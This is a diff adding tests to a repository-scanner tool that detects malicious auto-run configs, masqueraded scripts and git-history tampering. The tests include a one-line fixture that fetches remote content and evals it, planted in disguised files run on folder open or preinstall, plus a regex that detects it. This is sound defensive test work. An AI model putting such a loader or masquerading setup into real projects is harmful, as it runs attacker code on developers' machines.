@@ -7,7 +7,7 @@
  */
 
 import { afterEach, describe, expect, it, vi } from "vitest"
-import { scanGitHubRepo } from "../src/github/repo-scanner"
+import { extractCommandTargets, scanGitHubRepo } from "../src/github/repo-scanner"
 import type { SignatureDatabase } from "../src/types/index"
 
 const EMPTY_SIGNATURES: SignatureDatabase = {
@@ -671,5 +671,133 @@ describe("editor / agent config files and masqueraded scripts", () => {
       "fonts/b.ttf": "version https://git-lfs.github.com/spec/v1\noid sha256:abc\nsize 123\n"
     })
     expect(result.findings.filter((f) => f.pattern === "MASQUERADED_SCRIPT_FONT")).toEqual([])
+  })
+})
+
+describe("files that configs run with node", () => {
+  const LOADER_RULE: SignatureDatabase = {
+    ...EMPTY_SIGNATURES,
+    yaraRules: [{
+      id: "REMOTE_CODE_FROM_HTTP_RESPONSE",
+      name: "eval of HTTP response",
+      pattern: String.raw`\beval\s*\(\s*(?:err|res)\.(?:response\.)?data\b`,
+      description: "loader",
+      tags: [],
+      severity: "critical",
+      confidence: "high",
+      fileExtensions: [".js", ".mjs", ".cjs"]
+    }]
+  }
+  const LOADER = "require('axios').get(u).catch(err => { eval(err.response.data) })\n"
+
+  it("resolves node/bun targets relative to the folder a config runs from", () => {
+    expect(extractCommandTargets(
+      `{"tasks":[{"command":"node .vscode/spellright.dict"},{"command":"node","args":["src/assets/card4.jpeg"]}]}`,
+      "app/.vscode/tasks.json"
+    )).toEqual(["app/.vscode/spellright.dict", "app/src/assets/card4.jpeg"])
+    expect(extractCommandTargets(
+      `{"hooks":{"SessionStart":[{"hooks":[{"type":"command","command":"node \\"$CLAUDE_PROJECT_DIR\\"/.claude/hooks/start.js"}]}]}}`,
+      ".claude/settings.json"
+    )).toEqual([".claude/hooks/start.js"])
+    expect(extractCommandTargets(`{"scripts":{"preinstall":"node --no-warnings ./setup.mjs"}}`, "packages/a/package.json"))
+      .toEqual(["packages/a/setup.mjs"])
+  })
+
+  it("ignores inline code, absolute paths, URLs and paths outside the repo", () => {
+    expect(extractCommandTargets(
+      `{"a":"node -e \\"process.exit(0)\\"","b":"node /usr/lib/x.js","c":"node ../../x.js","d":"bun https://example.invalid/x.js","engines":{"node":">=18"}}`,
+      "package.json"
+    )).toEqual([])
+  })
+
+  it("scans a non-source file a task runs with node as JavaScript", async () => {
+    global.fetch = mockGitHubApi({
+      ".vscode/tasks.json": `{"tasks":[{"command":"node .vscode/spellright.dict","runOptions":{"runOn":"folderOpen"}}]}`,
+      ".vscode/spellright.dict": LOADER,
+      "src/index.js": "export {}\n"
+    }) as unknown as typeof fetch
+    const result = await scanGitHubRepo(repoInfo, { signatures: LOADER_RULE })
+    expect(result.scanSummary.scannedFiles).toContain(".vscode/spellright.dict")
+    expect(result.scanSummary.skippedFiles).toEqual([])
+    expect(result.findings.find((f) => f.file === ".vscode/spellright.dict")?.severity).toBe("critical")
+    expect(result.riskLevel).toBe("high")
+  })
+
+  it("does not follow CI workflow steps, which run on CI runners", async () => {
+    global.fetch = mockGitHubApi({
+      ".github/workflows/ci.yml": "jobs:\n  t:\n    steps:\n      - run: node scripts/check.dat\n",
+      "scripts/check.dat": LOADER
+    }) as unknown as typeof fetch
+    const result = await scanGitHubRepo(repoInfo, { signatures: LOADER_RULE })
+    expect(result.scanSummary.scannedFiles).not.toContain("scripts/check.dat")
+  })
+
+  it("reads an install-script target even when the source cap skipped it", async () => {
+    const files: Record<string, string> = {
+      "package.json": `{"name":"x","scripts":{"preinstall":"node setup.mjs"}}`
+    }
+    for (let index = 0; index < 210; index++) files[`src/f${index}.js`] = "export {}\n"
+    files["setup.mjs"] = LOADER
+    global.fetch = mockGitHubApi(files) as unknown as typeof fetch
+    const result = await scanGitHubRepo(repoInfo, { signatures: LOADER_RULE })
+    expect(result.scanSummary.scannedFiles).toContain("setup.mjs")
+    expect(result.scanSummary.skippedFiles.map((s) => s.path)).not.toContain("setup.mjs")
+    expect(result.findings.some((f) => f.file === "setup.mjs" && f.pattern === "REMOTE_CODE_FROM_HTTP_RESPONSE")).toBe(true)
+  })
+})
+
+describe("git-history signals", () => {
+  it("adds a backdated force push from the activity API to the scan", async () => {
+    const files = { "src/index.js": "export {}\n" }
+    const api = mockGitHubApi(files)
+    global.fetch = vi.fn(async (input: RequestInfo | URL) => {
+      const url = String(input)
+      if (url.includes("/activity?ref=refs%2Fheads%2Fmain")) {
+        return new Response(JSON.stringify([{
+          activity_type: "force_push", timestamp: "2026-07-31T10:00:00Z",
+          ref: "refs/heads/main", before: "a".repeat(40), after: MOCK_COMMIT_SHA
+        }]), { status: 200 })
+      }
+      if (url.includes(`/commits?sha=${MOCK_COMMIT_SHA}`)) {
+        return new Response(JSON.stringify([{
+          sha: MOCK_COMMIT_SHA,
+          commit: { committer: { date: "2025-11-06T09:00:00Z" }, verification: { verified: false } }
+        }]), { status: 200 })
+      }
+      return api(input)
+    }) as unknown as typeof fetch
+    const result = await scanGitHubRepo(repoInfo, { signatures: EMPTY_SIGNATURES })
+    expect(result.findings.find((f) => f.type === "GIT_HISTORY_TAMPERING")?.pattern).toBe("BACKDATED_PUSH")
+  })
+
+  it("scans normally when the history endpoints are unavailable", async () => {
+    const result = await scan({ "src/index.js": "export {}\n" })
+    expect(result.findings.filter((f) => f.type === "GIT_HISTORY_TAMPERING")).toEqual([])
+  })
+})
+describe("non-English comments (context only)", () => {
+  it("reports comments in another language as low, non-blocking context", async () => {
+    const russian = [
+      "// Эта функция загружает конфигурацию пользователя из локального хранилища и проверяет её",
+      "// Если конфигурация отсутствует, создаём новую с параметрами по умолчанию для приложения",
+      "// Сохраняем результат обратно, чтобы при следующем запуске не выполнять проверку снова",
+      "// Обработчик ошибок записывает сообщение в журнал и возвращает пустое значение вызывающему",
+    ].join("\n")
+    const result = await scan({ "src/config.js": `${russian}\nexport const load = () => null\n` })
+    const finding = result.findings.find((f) => f.type === "NON_ENGLISH_COMMENTS")
+    expect(finding).toMatchObject({ severity: "low", confidence: "low", cloneBlocking: false })
+    expect(result.safeToClone).toBe(true)
+  })
+
+  it("does not read URLs, lint directives and identifiers in English comments as another language", async () => {
+    const english = [
+      "// eslint-disable-next-line @typescript-eslint/no-unused-vars, vue/one-component-per-file",
+      "// see https://unpkg.com/@vbenjs/static-source@0.1.7/source/logo-v1.webp for the asset",
+      "// prettier-ignore cellRender: { name: 'CellImage' }, v-model:checked, v-model:fileList",
+      "// Create the output directory when it does not exist yet, then write every exported file",
+      "// The cache is invalidated whenever the configuration changes on disk or in settings",
+    ].join("\n")
+    const result = await scan({ "src/a.ts": `${english}\nexport const a = 1\n` })
+    expect(result.findings.filter((f) => f.type === "NON_ENGLISH_COMMENTS")).toEqual([])
   })
 })
